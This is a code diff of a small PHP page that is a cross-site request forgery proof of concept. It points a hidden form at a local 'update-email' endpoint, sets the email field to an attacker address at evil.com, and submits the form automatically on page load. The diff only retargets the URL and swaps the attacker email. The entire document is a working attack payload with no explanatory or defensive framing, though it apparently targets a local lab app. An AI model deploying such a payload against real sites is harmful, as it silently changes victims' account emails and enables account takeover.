@@ -1,13 +1,14 @@
 <?php
 
-$link = "http://localhost:8000/user/change"; // The link to the vulnerable action
+$link = "http://localhost:8080/user/settings/update-email"; // The link to the vulnerable action
+
 
 ?>
 
 <html>
     <body>
         <form action="<?php echo $link; ?>" method="POST">
-            <input type="hidden" name="email" value="pwned@evil-user.net" />
+            <input type="hidden" name="email" value="im.abadguy@evil.com" />
         </form>
         <script>
             document.forms[0].submit();
